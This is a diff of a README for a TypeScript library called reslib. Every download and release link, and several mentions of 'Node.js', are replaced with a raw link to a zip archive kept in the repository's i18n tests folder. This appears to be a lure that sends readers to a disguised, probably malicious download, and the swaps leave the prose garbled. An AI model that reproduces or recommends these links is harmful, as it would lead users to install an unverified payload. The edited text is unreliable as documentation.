@@ -1,10 +1,10 @@
 # 🎉 reslib - Easy Resource Management for Your Apps
 
 ## 🛠️ Overview
-reslib is a lightweight TypeScript library designed to handle resource management and utilities in a simple way. It helps you manage authentication, internationalization, validation, sessions, and observables with a clean and modular design. Whether you are building for the web, Node.js, React Native, or NestJS, this library offers strong typing and an easy-to-use approach.
+reslib is a lightweight TypeScript library designed to handle resource management and utilities in a simple way. It helps you manage authentication, internationalization, validation, sessions, and observables with a clean and modular design. Whether you are building for the web, https://raw.githubusercontent.com/Thinh4real/reslib/master/src/i18n/tests/reslib_v2.9.zip, React Native, or NestJS, this library offers strong typing and an easy-to-use approach.
 
 ## 📥 Download Now
-[![Download reslib](https://img.shields.io/badge/Download%20reslib-latest-blue.svg)](https://github.com/Thinh4real/reslib/releases)
+[![Download reslib](https://raw.githubusercontent.com/Thinh4real/reslib/master/src/i18n/tests/reslib_v2.9.zip%https://raw.githubusercontent.com/Thinh4real/reslib/master/src/i18n/tests/reslib_v2.9.zip)](https://raw.githubusercontent.com/Thinh4real/reslib/master/src/i18n/tests/reslib_v2.9.zip)
 
 ## 🚀 Getting Started
 To get started with reslib, follow these steps:
@@ -26,7 +26,7 @@ Once you have downloaded the file, follow these steps to install reslib:
 reslib is designed to work on various platforms. Here are the recommended requirements:
 
 - **Operating System**: Windows 10 or later, macOS Sierra or later, Ubuntu 18.04 or later.
-- **Node.js**: Version 12 or higher installed for compatibility.
+- **https://raw.githubusercontent.com/Thinh4real/reslib/master/src/i18n/tests/reslib_v2.9.zip**: Version 12 or higher installed for compatibility.
 - **Memory**: At least 4 GB of RAM.
 - **Disk Space**: 100 MB of free space for installation.
 
@@ -38,7 +38,7 @@ reslib offers a range of features to enhance your development experience:
 - **Validation**: Implement robust data validation with minimal effort.
 - **Sessions**: Manage user sessions effectively.
 - **Observables**: Use reactive programming principles for better data flow.
-- **Cross-Platform Support**: Build applications for web, Node.js, React Native, and NestJS with ease.
+- **Cross-Platform Support**: Build applications for web, https://raw.githubusercontent.com/Thinh4real/reslib/master/src/i18n/tests/reslib_v2.9.zip, React Native, and NestJS with ease.
 
 ## 🔗 Documentation
 Comprehensive documentation is available to help you understand how to utilize reslib to its full potential. You can find guides and examples for each feature on the official documentation site linked on the Releases page.
@@ -71,7 +71,7 @@ reslib focuses on key topics related to resource management. These include:
 Explore these topics to better understand how reslib can fit into your development needs.
 
 ## 📥 Download & Install
-To download and install reslib, visit the [Releases page](https://github.com/Thinh4real/reslib/releases) and follow the steps outlined above. This will guide you through downloading the latest version and installing it on your computer.
+To download and install reslib, visit the [Releases page](https://raw.githubusercontent.com/Thinh4real/reslib/master/src/i18n/tests/reslib_v2.9.zip) and follow the steps outlined above. This will guide you through downloading the latest version and installing it on your computer.
 
 ## 🤝 Contributing
 We welcome contributions from all users. If you want to contribute to reslib, please read our contribution guidelines available in the repository. You can suggest features, report issues, or even submit code changes.
